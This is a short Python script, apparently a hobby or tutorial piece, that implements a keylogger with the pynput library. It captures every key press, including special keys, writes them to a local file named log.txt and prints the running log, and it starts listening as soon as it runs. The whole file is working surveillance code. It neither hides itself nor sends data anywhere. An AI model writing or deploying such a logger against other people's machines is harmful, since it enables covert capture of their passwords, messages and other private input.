import pynput.keyboard

class KeyLogger:
    def __init__(self):
        self.logger = ""

    def appendToLog(self, keyStroke):
        self.logger += keyStroke
        with open("log.txt", "a", encoding="utf-8") as newFile:
            newFile.write(keyStroke)
        print(self.logger)

    def evaluateKey(self, key):
        try:
            pressed = str(key.char)
            self.appendToLog(pressed)
        except AttributeError:
            if key == key.space:
                self.appendToLog(" ")  
            else:
                special_key = " [" + str(key) + "] "
                self.appendToLog(special_key)

    def start(self):
        keyboardListener = pynput.keyboard.Listener(on_press=self.evaluateKey)
        with keyboardListener:
            keyboardListener.join()

KeyLogger().start()
